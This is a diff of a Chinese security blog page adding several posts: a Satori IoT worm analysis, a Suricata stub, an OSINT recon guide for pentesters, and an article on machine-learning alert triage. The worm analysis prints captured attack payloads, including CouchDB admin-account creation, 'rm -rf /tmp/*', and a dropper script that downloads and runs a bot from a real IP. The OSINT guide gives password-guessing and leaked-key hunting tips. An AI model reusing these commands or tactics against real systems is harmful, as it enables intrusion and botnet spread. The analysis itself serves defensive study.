@@ -91,7 +91,390 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://wsygoogol.github.io/2016/06/08/About-the-Blog/" data-id="cjl3hvmjk000rs89ltuc8fw22" class="article-share-link">Share</a>
+      <a data-url="http://wsygoogol.github.io/2016/06/08/About-the-Blog/" data-id="cjprqg7mv000q0c9l883rqq2z" class="article-share-link">Share</a>
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+  
+    <article id="w-Satori-物联网蠕虫分析" class="article article-type-w" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2018/09/17/Satori-物联网蠕虫分析/" class="article-date">
+  <time datetime="2018-09-17T09:50:48.000Z" itemprop="datePublished">2018-09-17</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2018/09/17/Satori-物联网蠕虫分析/">Satori 物联网蠕虫分析</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h4 id="0x00-样本植入"><a href="#0x00-样本植入" class="headerlink" title="0x00 样本植入"></a>0x00 样本植入</h4><p>​    我们通过高交互蜜罐捕获到Satori 变种物联网蠕虫样本，Satori是一个Mirai的变种，主要是利用物联网设备的漏洞进行传播，本次捕获的样本利用了4个路由器漏洞：</p>
+<p><img src="D:\gitBlog\themes\landscape\source\upload_image\hdr.png" alt="hdr"></p>
+<p>​    攻击者利用couchdb权限提升漏洞和couchdb远程命令执行漏洞向蜜罐系统植入了一个shell脚本，执行shell脚本下载样本并执行。</p>
+<p>payload如下：</p>
+<p>添加admin帐户，password：guest</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">PUT /_users/org.couchdb.user:guest HTTP/1.1</div><div class="line"></div><div class="line">&#123;<span class="string">"type"</span>: <span class="string">"user"</span>, <span class="string">"name"</span>: <span class="string">"guest"</span>, <span class="string">"roles"</span>: [<span class="string">"_admin"</span>], <span class="string">"roles"</span>: [],<span class="string">"password"</span>: <span class="string">"guest"</span>&#125;</div></pre></td></tr></table></figure>
+<p>清空/tmp目录</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">PUT /_config/query_servers/cmd HTTP/1.1</div><div class="line"><span class="string">"rm -rf /tmp/*"</span></div></pre></td></tr></table></figure>
+<p>wget下载shell脚本cch到/tmp目录并执行：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">PUT /_users/org.couchdb.user:guest HTTP/1.1</div><div class="line">wget http://148.72.176.78/cch -O /tmp/cch</div><div class="line">PUT /_config/query_servers/cmd HTTP/1.1</div><div class="line">sh /tmp/cch</div></pre></td></tr></table></figure>
+<p>cch的内容如下,功能就是从服务器”148.72.176.78”下载样本ken.x86，并执行</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line">n=<span class="string">"ken.x86"</span></div><div class="line">http_server=<span class="string">"148.72.176.78"</span></div><div class="line"><span class="built_in">dirs</span>=<span class="string">"/tmp/ /dev/ /dev/shm/ /var/ /var/run/ /var/tmp/"</span></div><div class="line"></div><div class="line"><span class="keyword">for</span> dir <span class="keyword">in</span> <span class="variable">$dirs</span></div><div class="line"><span class="keyword">do</span></div><div class="line"> &gt;<span class="variable">$dir</span>.file &amp;&amp; <span class="built_in">cd</span> <span class="variable">$dir</span></div><div class="line"><span class="keyword">done</span></div><div class="line"></div><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="variable">$n</span></div><div class="line"><span class="keyword">do</span></div><div class="line"> cp <span class="variable">$SHELL</span> <span class="variable">$i</span></div><div class="line"> &gt;<span class="variable">$i</span></div><div class="line"> chmod 777 <span class="variable">$i</span></div><div class="line"> wget http://<span class="variable">$http_server</span>/<span class="variable">$i</span> -O- &gt;<span class="variable">$i</span> || curl -O http://<span class="variable">$http_server</span>/$</div><div class="line"> chmod 777 <span class="variable">$i</span></div><div class="line"> ./<span class="variable">$i</span></div><div class="line"><span class="keyword">done</span></div></pre></td></tr></table></figure>
+<h4 id="0x01-样本分析"><a href="#0x01-样本分析" class="headerlink" title="0x01 样本分析"></a>0x01 样本分析</h4><p>​    样本利用了4个路由器漏洞：<a href="https://www.exploit-db.com/exploits/43414/" target="_blank" rel="external">Huawei Router HG532命令执行漏洞</a>，<a href="https://www.exploit-db.com/exploits/44760/" target="_blank" rel="external">D-Link DSL-2750B OS命令注入漏洞</a>,<a href="https://www.exploit-db.com/exploits/37171/" target="_blank" rel="external">D-Link Devices HNAP SOAPAction-Header命令注入漏洞</a>,<a href="https://www.exploit-db.com/exploits/37169/" target="_blank" rel="external">Realtek SDK Miniigd UPnP SOAP命令执行漏洞</a>。这四个漏洞在之前捕获的Mirai和Satori样本中均出现过，利用的非常多。</p>
+<p>下面对Huawei Router HG532命令执行漏洞的利用过程进行分析.</p>
+<p>1.创建子进程，通过util_local_addr()获取本地IP地址：</p>
+<p><img src="D:\gitBlog\themes\landscape\source\upload_image\huawei_1.png" alt="huawei_1"></p>
+<p>2.设置原始套接字，失败则退出：</p>
+<p><img src="D:\gitBlog\themes\landscape\source\upload_image\huawei_3.png" alt="huawei_3"></p>
+<p>3.设置IPv4的报文头部，tcph_0-&gt;dest为目的端口：37215，tcph-&gt;source为源端口。 </p>
+<p><img src="D:\gitBlog\themes\landscape\source\upload_image\huawei_6.png" alt="huawei_6"></p>
+<p>4.通过huaweiscanner_get_random_ip()函数随机生成IP地址,通过sendto()函数向对应IP的37215端口发送数据包</p>
+<p><img src="D:\gitBlog\themes\landscape\source\upload_image\huawei5.png" alt="huawei5"></p>
+<p>5.扫描到开放37215端口的主机后尝试使用payload建立连接，执行wget命令从指定服务器IP:148.72.176.78中下载恶意文件。</p>
+<p><img src="D:\gitBlog\themes\landscape\source\upload_image\huawei.png" alt="huawei"></p>
+<p>​    其他三个漏洞的利用过程与上面的过程基本相同，只是换了对应的端口和payload：</p>
+<p>D-Link Devices HNAP SOAPAction-Header命令注入漏洞，攻击8081端口，payload如下：</p>
+<p><img src="D:\gitBlog\themes\landscape\source\upload_image\hnap.png" alt="hnap"></p>
+<p>D-Link DSL-2750B OS命令注入漏洞，攻击80和8080端口，payload如下：</p>
+<p><img src="D:\gitBlog\themes\landscape\source\upload_image\dlink.png" alt="dlink"></p>
+<p>Realtek SDK Miniigd UPnP SOAP命令执行漏洞，攻击52869端口，payload如下：</p>
+<p><img src="D:\gitBlog\themes\landscape\source\upload_image\rrr.png" alt="rrr"></p>
+<p>​    通过与Mirai的对比分析发现，这个样本的攻击过程与Mirai几乎一致，具有同源性，确定为Mirai变种。均是通过随机生成ip地址扫描特定的端口，Mirai扫描23端口，该样本扫描8081（Hnap）、80和8080（Dlink）、52869(Realtek)、37215（Huawei）。发现主机后，Mirai是尝试弱口令通过telnet进行登陆，而这个样本则是通过相应的payload尝试从指定主机中下载感染bot程序进行感染。 </p>
+<p>​    由于Mirai 的源码已经在网上公开，改造 Mirai ，以其变种身份形式出现，构造巨大的僵尸网络早已不是难事。这也是为什么自Mirai后，发现了大量Mirai变种形成的僵尸网络。</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://wsygoogol.github.io/2018/09/17/Satori-物联网蠕虫分析/" data-id="cjprqg7tc00150c9lz6h4ysgc" class="article-share-link">Share</a>
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+  
+    <article id="w-Suricata-tips" class="article article-type-w" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2018/09/14/Suricata-tips/" class="article-date">
+  <time datetime="2018-09-14T06:47:51.000Z" itemprop="datePublished">2018-09-14</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2018/09/14/Suricata-tips/">Suricata tips</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h4 id="Install"><a href="#Install" class="headerlink" title="Install"></a>Install</h4><p><a href="https://blog.rapid7.com/2017/02/14/how-to-install-suricata-nids-on-ubuntu-linux/" target="_blank" rel="external">https://blog.rapid7.com/2017/02/14/how-to-install-suricata-nids-on-ubuntu-linux/</a></p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://wsygoogol.github.io/2018/09/14/Suricata-tips/" data-id="cjprqg7t800100c9l9cc0lesg" class="article-share-link">Share</a>
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+  
+    <article id="post-开源情报收集" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2018/09/11/开源情报收集/" class="article-date">
+  <time datetime="2018-09-11T01:27:51.000Z" itemprop="datePublished">2018-09-11</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2018/09/11/开源情报收集/">开源情报收集</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>​    渗透测试总是需要从广泛的信息收集阶段开始。 本文讨论了如何使用Internet上的开源信息来构建目标的概要。 收集的数据可用于识别服务器，域，版本号，漏洞，错误配置，可利用的端点和敏感信息泄漏。</p>
+<p>​    通过开源情报收集技术可以发现大量数据，特别是对于拥有大量在线业务的公司。 总有一些微小的代码，一个技术论坛问题，精心设计的细节，一个长期被遗忘的子域，甚至包含可以用于目标站点的数据的营销材料的PDF。 即使简单的谷歌搜索通常也会产生有趣的结果。 以下是我们拥有客户端（域）名称（无特定顺序）后所做的一些事情：</p>
+<h4 id="1"><a href="#1" class="headerlink" title="1"></a>1</h4><p>​    Whois查找以查找管理员电子邮件地址。 这些电子邮件地址通常也作为应用程序上的有效用户存在。 可以通过数据库泄漏或通过HaveIBeenPwned(<a href="https://haveibeenpwned.com/)等搜索服务搜索电子邮件地址，该服务会告诉您是否发现您的电子邮件是违规行为的一部分。![img](https://cdn-images-1.medium.com/max/1000/1*j75XCqSNPVzp9y8GAYxTyA.png" target="_blank" rel="external">https://haveibeenpwned.com/)等搜索服务搜索电子邮件地址，该服务会告诉您是否发现您的电子邮件是违规行为的一部分。![img](https://cdn-images-1.medium.com/max/1000/1*j75XCqSNPVzp9y8GAYxTyA.png</a>)</p>
+<p>​    除了电子邮件地址，whois查询还可以IP历史信息，域过期日期甚至电话号码,这些可以在社会工程学中得到应用。</p>
+<p><img src="https://cdn-images-1.medium.com/max/1200/1*1HByjz1nYKKi4s3EuAhV_g.png" alt="img"></p>
+<h4 id="2"><a href="#2" class="headerlink" title="2"></a>2</h4><p>​    使用site 运算符的Google高级搜索，来限制目标网站，查找php（或任何服务端脚本文件类型），txt或者log文件。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">site:*.example.org ext:php | ext:txt | ext:<span class="built_in">log</span></div></pre></td></tr></table></figure>
+<p>​    我们曾多次使用类似搜索查询识别出包含敏感信息和应用程序完整系统路径的有趣文件（例如日志文件）。 您可以将此查询与减号运算符结合来排除特定搜索结果。</p>
+<p><img src="https://cdn-images-1.medium.com/max/1200/1*pOtl_CjECSnkkGBJxC6YsA.png" alt="img"></p>
+<h4 id="3"><a href="#3" class="headerlink" title="3"></a>3</h4><p>​    对域（和子域）执行搜索， 文件类型包括PDF，Excel，Word和PowerPoint。 这些文档可能包含可用于其他攻击的信息。 通常，文件中包含的文档数据（作者姓名等）可以用作应用程序本身的有效用户名。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">site:*.example.org ext:pdf | ext:doc| ext:docx | ext:ppt | ext:pptx | ext:xls | ext:xlsx | ext:csv</div></pre></td></tr></table></figure>
+<p>您可以在本地下载这些文件，并通过文档元数据提取程序运行它们，或查看每个文件的属性,查看泄漏的信息。</p>
+<p>要查看可用于搜索数据的所有选项，请参阅<a href="https://www.google.co.in/advanced_search。" target="_blank" rel="external">https://www.google.co.in/advanced_search。</a> 此外，<a href="https://www.exploit-db.com/google-hacking-database/" target="_blank" rel="external">Google Hacking Database</a>(现在在exploit-db上)允许您使用预先制作的查询来搜索Internet上特定和有趣的内容。 </p>
+<p><img src="https://cdn-images-1.medium.com/max/1200/1*QJiz9QCCagjYI0Ak9yg7NQ.png" alt="img"></p>
+<h4 id="4"><a href="#4" class="headerlink" title="4"></a>4</h4><p>​    检查robots.txt文件中隐藏的有趣目录。 大多数框架和内容管理系统都有明确定义的目录结构。 所以admin目录是/admin或/administration请求。 如果没有，robots.txt很可能包含您寻找的目录名称。</p>
+<p><img src="https://cdn-images-1.medium.com/max/1200/1*cfw6vicXCwQc1xh5PlZz_g.png" alt="img"></p>
+<h4 id="5"><a href="#5" class="headerlink" title="5"></a>5</h4><p>​    浏览HTML源代码以识别/CMS/框架等。识别应用程序类型有助于将攻击集中在具有易受攻击的组件（例如插件和主题）。 例如，如果您查看页面源并查看wp-content，那么您可以确定您正在浏览WordPress站点。</p>
+<p>​    许多公开可用的浏览器插件也可用于识别网站框架。 Firefox上的Wappalyzer在识别网站上的几种不同服务器类型，服务器和客户端框架以及第三方插件方面做得非常出色。</p>
+<p><img src="https://cdn-images-1.medium.com/max/1200/1*LLK4o3wfggc_zvHYhLDYSA.png" alt="img"></p>
+<h4 id="6"><a href="#6" class="headerlink" title="6"></a>6</h4><p>​    通常情况下，如果您正在查看的网站是由第三方供应商创建的，那么您很可能会在主页底部的某处看到“Powered by Third-Party-Developer-Company”。</p>
+<p>​    使用它来跟踪您收集到承包商网站的信息，也可以获得令人难以置信的回报。 浏览它可能会得到它们构建的框架类型和版本号。 作为其开发计划的一部分，承包商很可能在您客户的网站上拥有测试/管理员帐户。</p>
+<p>​    根据我的经验，许多网站管理员/开发人员经常使用的密码是公司名称（客户公司或承包商的公司）的变体，最后是一些带/不带特殊字符的数字。 例如，如果承包商公司被称为“示例开发人员”，则001Example，Example001,00example，example00等是在客户网站的登录面板上尝试的良好密码候选者。</p>
+<h4 id="7"><a href="#7" class="headerlink" title="7"></a>7</h4><p>​    查看公司的LinkedIn个人资料，以确定高级经理，董事和非技术人员。 很多时候，最薄弱的密码属于许多公司的管理人员。 搜索公司网站上的“关于我们”页面也可以找到薄弱的目标。</p>
+<p>​    基于一些电子邮件，可以推测出用户名的标准格式。 一旦理解了用户名格式，就可以创建一个电子邮件地址h和用户名列表，然后可以用它们来执行其他攻击，包括登录页面的暴力破解甚至利用弱密码重置功能。 </p>
+<h4 id="8"><a href="#8" class="headerlink" title="8"></a>8</h4><p>​    执行与IP地址相关的检查。 由于托管在同一IP（共享主机）上的应用程序不同且较弱，因此应用程序通常会受到攻击。 使用反向IP查找，您可以识别其他目标。 Bing使用IP进行搜索的功能很强大。</p>
+<p><img src="https://cdn-images-1.medium.com/max/1200/1*Dtm_iquz8ORZ5XF52dKIyQ.png" alt="img"></p>
+<p>反向查找工具：<a href="https://www.yougetsignal.com/tools/web-sites-on-web-server/" target="_blank" rel="external">you get signal</a> 和 <a href="https://www.ip-address.org/reverse-lookup/reverse-ip.php" target="_blank" rel="external">IP Address</a></p>
+<p>​    作为使用IP地址进行检查的一部分，还必须注意域名的A和PTR记录。有时由于配置错误，在使用PTR或站点的A记录时可能会访问其他站点。 可以使用nslookup或dig命令获取此信息 :</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">dig -x 8.8.8.8 </div><div class="line">nslookup 8.8.8.8</div></pre></td></tr></table></figure>
+<h4 id="9"><a href="#9" class="headerlink" title="9"></a>9</h4><p>​    子域名枚举，以找到客户端托管基础架构较弱的入口点。 子域枚举是评估和发现客户在线公开的资产的最重要步骤之一; 故意作为其业务的一部分或由于配置错误而意外发生。</p>
+<p>​    子域名枚举可以使用各种工具完成，例如dnsrecon，subbrute，knock.py，使用Google的site操作符或dnsdumpster甚至virustotal.com等网站。 大多数这些工具使用大型常用描述性词典，如<em>admin, pages, people, hr, downloads, blog, dev</em> 等。这些单词附加到主域 - example.org，以创建可能的子列表 域名，如admin.example.org，pages.example.org，people.example.org等。然后可以针对DNS服务器检查这些名称验证条目是否存在。</p>
+<p><img src="https://cdn-images-1.medium.com/max/1200/1*xSFqM6qaDY6f5d5hddhALw.png" alt="img"></p>
+<h4 id="10"><a href="#10" class="headerlink" title="10"></a>10</h4><p>​    查找不同类型资源请求的HTTP状态代码和响应标头。 对于有效页面，对于非现有页面，对于重定向的页面，对于目录名称等。在响应头中查找细微的拼写错误，额外空格和冗余值。</p>
+<p><img src="https://cdn-images-1.medium.com/max/1200/1*H8zBQkiUGzTud1RRTRTKNA.png" alt="img"></p>
+<p>一个非常巧妙的X-Frame-Options标题。标题开头的额外空格使标题本身无效。 </p>
+<p>​    另外，请注意<a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP" target="_blank" rel="external">CSP头</a>。 它们包含允许脚本加载的域名和来源。 有时，CSP标头中列出的域名中的拼写错误或托管CDN的不安全JavaScript可能是您执行XSS有效负载的唯一方法:)</p>
+<h4 id="11"><a href="#11" class="headerlink" title="11"></a>11</h4><p>通过Shodan和Censys搜索客户端的域名，以查找文件，IP地址，公开的服务和错误消息。 Shodan和censys扫描了互联网，列举了服务并对他们的调查结果进行了分类，使他们能够通过简单的关键字进行搜索。 这两项服务都可以用来发现大量有趣的东西，包括开放式摄像机，思科设备，医院设施管理服务器，弱配置的telnet和snmp服务以及SCADA系统。 过去曾使用Censys来查找托管源代码和完整应用程序的整个docker镜像的有趣端点。</p>
+<h4 id="12"><a href="#12" class="headerlink" title="12"></a>12</h4><p>​    在github，gitlab，bitbucket等代码托管服务上查找客户端。通过可搜索的存储库在线托管的代码中可以找到各种有趣的东西，包括Web漏洞，Web应用程序中的0days，配置问题，AWS和其他密钥。</p>
+<p>​    开发人员经常使用生产密码或API访问密钥提交代码，以便稍后实现和删除敏感信息并进行其他提交。 但是，使用提交日志并检出特定提交，可以检索这些敏感信息，然后可以使用这些信息对客户端的托管基础架构发起完全攻击。</p>
+<p>​    像Gitrob这样的工具可用于查询Github并从命令行本身搜索特定组织的敏感文件。</p>
+<h4 id="13"><a href="#13" class="headerlink" title="13"></a>13</h4><p>​    浏览网站的HTML源，以确定客户端是否在云上托管任何静态内容。 像image，js和css文件这样的内容可能托管在客户端拥有的s3数据库上。 在执行标准侦察时也可以识别客户端是否使用云下文来托管静态/动态内容。 在这种情况下，如果客户端在数据库上配置了错误的配置，那么查找客户端使用的数据库可能会非常有益。 在面向公众的数据库中可以找到大量有趣的信息。</p>
+<p>​    像DigiNinja的Bucket Finder这样的工具可用于通过数据库的名称来自动化搜索过程。此工具需要精心策划的存储桶名称列表和潜在的完整URL才能生效。 </p>
+<p><img src="https://cdn-images-1.medium.com/max/1200/1*I-UpzxJV6OgLbh4FGgopQg.png" alt="img"></p>
+<p><img src="https://cdn-images-1.medium.com/max/1200/1*2hv9j6-GPGR9JuMMkwETYw.png" alt="img"></p>
+<p>​    有各种类型的数据可以归类为OSINT数据，但从渗透测试者的角度来看，所有这些数据都不重要。 作为渗透测试人员，我们或多或少对以下类别的信息感兴趣 ：</p>
+<p>1.增加攻击面（域，网块等）的信息<br>2.凭据（电子邮件地址，用户名，密码，API密钥等）<br>3.敏感信息（客户详细信息，财务报告等）<br>4.基础设施细节（技术堆栈，使用的硬件设备等）</p>
+<p>开源情报（OSINT）是从公开来源收集到数据。</p>
+<h3 id="12-种-OSINT-信息收集技巧"><a href="#12-种-OSINT-信息收集技巧" class="headerlink" title="12 种 OSINT 信息收集技巧"></a>12 种 OSINT 信息收集技巧</h3><h4 id="1-1"><a href="#1-1" class="headerlink" title="1"></a>1</h4><p>SSL/TLS证书具有丰富的信息，这些信息在安全评估期间非常重要。</p>
+<p>SSL / TLS证书通常包含域名，子域名和电子邮件地址。这使他们成为攻击者的宝库。 </p>
+<h4 id="2-1"><a href="#2-1" class="headerlink" title="2"></a>2</h4><p>WHOIS服务通常在渗透测试期间用于查询与Internet资源的注册用户相关的信息，例如域名或IP地址（块）。 WHOIS枚举对于在互联网上拥有大量存在的目标组织尤其有效。</p>
+<p>一些公共WHOIS服务器支持高级查询，我们可以使用这些查询来收集目标组织的各种信息。 </p>
+<p>让我们看一些先进的WHOIS查询来收集信息:</p>
+<p>我们可以查询ARIN WHOIS服务器以返回具有给定域名的电子邮件地址的所有条目，在本例中为icann.org。我们只从结果中提取电子邮件地址。 </p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">whois -h whois.arin.net <span class="string">"e @ icann.org"</span> | grep -E -o <span class="string">"\b[a-zA-Z0-9.-]+@[a-zA-Z0–9.-]+\.[a-zA-Z0–9.-]+\b"</span> | uniq</div></pre></td></tr></table></figure>
+<p>我们可以查询RADB WHOIS服务器以返回属于自治系统号（ASN）的所有网段</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">whois -h whois.radb.net -- <span class="string">'-i origin AS111111'</span> | grep -Eo <span class="string">"([0-9.]+)&#123;4&#125;/[0-9]+"</span> | uniq</div></pre></td></tr></table></figure>
+<p>我们可以查询ARIN WHOIS服务器以返回给定关键字的所有POC，ASN，组织和最终用户客户。 </p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">whois -h whois.arin.net <span class="string">"z wikimedia"</span></div></pre></td></tr></table></figure>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://wsygoogol.github.io/2018/09/11/开源情报收集/" data-id="cjprqg7ti001d0c9ljlcgh8k1" class="article-share-link">Share</a>
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+  
+    <article id="w-构建SOC的机器学习分析模型" class="article article-type-w" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2018/09/06/构建SOC的机器学习分析模型/" class="article-date">
+  <time datetime="2018-09-06T01:47:45.000Z" itemprop="datePublished">2018-09-06</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2018/09/06/构建SOC的机器学习分析模型/">构建SOC的机器学习分析模型</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h5 id="基本监督模型过程"><a href="#基本监督模型过程" class="headerlink" title="基本监督模型过程"></a>基本监督模型过程</h5><p>​    数据科学术语是“有监督的分类模型”，它被“监督”意味着它通过已被标记为正常或恶意的数据来学习，并且它是一种被训练的“分类模型”，我们希望它检测一个新的数据能几个离散的结果之间做出决策。在我们的例子中，我们只希望它在告警的两个“类”之间做出决定：恶意和正常。<br>    为了开始创建这样的模型，必须收集数据集。该数据集构成了模型的“经验”，是我们用来“训练”模型以做出决策的信息。监督模型，每个数据单元必须标记为恶意或正常，以便模型可以评估每个观察结果，并弄清楚是什么使它恶意，什么使它正常。通常，收集干净的标记数据集是监督模型管道中最难的部分之一; 但是，就我们的SOC而言，我们的分析师每周都会不断地对数千个警报进行分类（或“标记”），因此我们很能够获得大量干净，标准化的标签警报。</p>
+<p>​    一旦定义了标记数据集，下一步就是定义“功能”，可用于描绘每个告警中的信息。“特征”可以被认为是这一点信息的一个方面。例如，如果信息表示为字符串，则自然“特征”可以是字符串的长度。为我们的警报分类模型构建功能背后的核心思想是找到一种方法来表示和记录分析师在做出决策时可能考虑的所有方面。</p>
+<p>然后，构建模型需要选择要使用的模型结构，并在可用总数据的子集上训练模型。训练数据集越大越多样化，模型通常表现越好。剩下的数据用作“测试集”，以查看训练的模型是否确实有效。拿出这个测试装置可以确保模型在以前从未见过的样品上进行评估，但真正的标签是已知的。</p>
+<p>最后，确保有一种方法可以评估模型随时间的效果，以及调查错误以便进行适当的调整。如果没有计划和管道进行评估和重新培训，该模型几乎肯定会在性能上衰退。</p>
+<h5 id="特征工程"><a href="#特征工程" class="headerlink" title="特征工程"></a>特征工程</h5><p>​    在创建我们自己的模型之前，我们采访了经验丰富的分析师，并在做出警报决策之前记录了他们通常评估的信息。这些访谈构成了我们的特征提取的基础。例如，当分析师说审查警报“很容易”时，我们会问：“为什么？什么可以帮助你做出这个决定？“正是这种逆向工程的各种方法让我们可以深入了解我们可以用来捕捉分析的特征和模型。</p>
+<p>例如，考虑一个进程执行事件。有关潜在恶意进程执行的警报可能包含以下字段：</p>
+<p>进程路径<br>进程MD5<br>父进程<br>进程命令参数<br>虽然这可能最初看起来像一个有限的特征空间，但是可以从这些字段中提取许多有用的信息。</p>
+<p>从“C：\ windows \ temp \ m.exe”的进程路径，分析师可以立即看到一些特征：</p>
+<p>该进程驻留在一个临时文件夹中：C：\ windows \ temp \<br>该进程是文件系统深处的两个目录<br>进程可执行文件名称长度为一个字符<br>该进程具有.exe扩展名<br>该过程不是“常见”进程名称<br>虽然这些看似简单，但在大量数据和示例中，提取这些信息将有助于模型区分事件。即使是最基本方面也必须被捕获，以“教导”模型以分析师的方式查看程序。</p>
+<p>然后将这些特征编码为更离散的表示，类似于：</p>
+<table>
+<thead>
+<tr>
+<th>Temp_folder</th>
+<th>Depth</th>
+<th>Name_Length</th>
+<th>Extension</th>
+<th>common_process_name</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>TRUE</td>
+<td>2</td>
+<td>1</td>
+<td>exe</td>
+<td>FALSE</td>
+</tr>
+</tbody>
+</table>
+<p>关于进程执行，需要考虑的另一个重要特性是父流程和子流程的组合。偏离预期的“血统”可能是恶意活动的强烈指标。</p>
+<p>假设上述示例的父进程是’powershell.exe’。然后可以从父进程和进程本身的串联中获得潜在的新功能：’powershell.exe_m.exe’。这在功能上用作父子关系的标识，并捕获另一个关键分析工件。</p>
+<p>然而，最富裕的领域可能是过程论证。流程参数是他们自己的语言，语言分析是预测分析的良好前提空间。</p>
+<p>我们可以寻找包括但不限于：</p>
+<p>网络连接字符串（例如’http：//‘，’https：//‘，’ftp：//‘）。<br>Base64编码命令<br>注册表键（’HKLM’，’HKCU’）<br>混淆的证据（蜱，$，分号）（阅读Daniel Bohannon的更多工作）<br>这些特征及其值在训练数据集中的显示方式将定义模型的学习方式。基于数千个警报的功能分布，特征和标签之间将开始出现关系。然后，这些关系将记录在我们的模型中，并最终用于影响新警报的预测。查看训练集中的特征分布可以深入了解这些潜在关系中的一些。</p>
+<p>例如，图2显示了在按恶意（红色）和良性（蓝色）分组时如何显示“处理命令长度”的分布。</p>
+<p>图2：按流程命令长度分组的流程事件警报的分布</p>
+<p>此图表显示，在一部分样本中，命令长度越长，恶意的可能性就越大。这表现为右侧为红色，左侧为蓝色。但是，工艺长度不是唯一的因素。</p>
+<p>作为我们的功能集的一部分，我们还认为近似每个命令的“复杂性”是有用的。为此，我们使用了“ Shannon entropy ”，这是一种常用的度量标准，用于衡量一串字符中存在的随机性程度。</p>
+<p>图3显示了命令熵的分布，分为恶意和良性。虽然这些类没有完全分开，但我们可以看到，对于这个数据样本，具有较高熵的样本通常具有较高的恶意机会。</p>
+<p>图3：按熵分组的流程事件警报的分布</p>
+<p>模型选择与推广<br>一旦为整个数据集生成了特征，就可以使用它们来训练模型。选择最佳模型没有完美的程序，但查看数据中的特征类型可以帮助缩小范围。在流程事件的情况下，我们有一些表示为字符串和数字的功能组合。当分析师评估每个工件时，他们会询问有关每个工件的问题，并将这些问题结合起来估算流程是恶意的概率。</p>
+<p>对于我们的用例，优先考虑“可解释的”模型也是有意义的 - 也就是说，可以更容易地揭示它为什么做出关于工件的特定决定的模型。通过这种方式，分析师可以建立对模型的信心，以及检测和修复模型正在制造的分析错误。鉴于数据的性质，分析师做出的决策以及对可解释性的渴望，我们认为基于决策树的模型非常适合于警报分类。</p>
+<p>有许多公开可用的资源可以学习决策树，但决策树背后的基本直觉是它是一个迭代过程，要求一系列问题试图得出一个非常自信的答案。任何玩过“二十个问题”游戏的人都熟悉这个概念。最初，要求提出一般性问题以帮助消除可能性，然后要求更具体的问题来缩小可能性。在提出足够的问题并回答之后，“提问者”认为他们很有可能猜出正确的答案。</p>
+<p>图4显示了可用于评估流程执行的决策树的示例。</p>
+<p>图4：用于确定警报是良性还是恶意的决策树</p>
+<p>对于图中的示例警报，“决策路径”标记为红色。这就是此决策树模型进行预测的方式。它首先问：“长度是否大于100个字符？”如果是这样，它会转到下一个问题“它是否包含字符串’http’？”等等，直到它有信心做出有根据的猜测。在图4的示例中，假设在此决策路径中传播的所有训练警报中有95％是恶意的，该模型预测此警报也有95％的可能性是恶意的。</p>
+<p>因为他们可以询问这些详细的问题组合，所以决策树可能会“过度拟合”，或者学习与训练集过于紧密联系的规则。这降低了模型“推广”到新数据的能力。减轻这种影响的一种方法是使用许多稍微不同的决策树，并让它们各自对结果“投票”。决策树的这种“集合”称为随机森林，它可以在野外部署时提高模型的性能。这是我们最终为我们的模型选择的算法。</p>
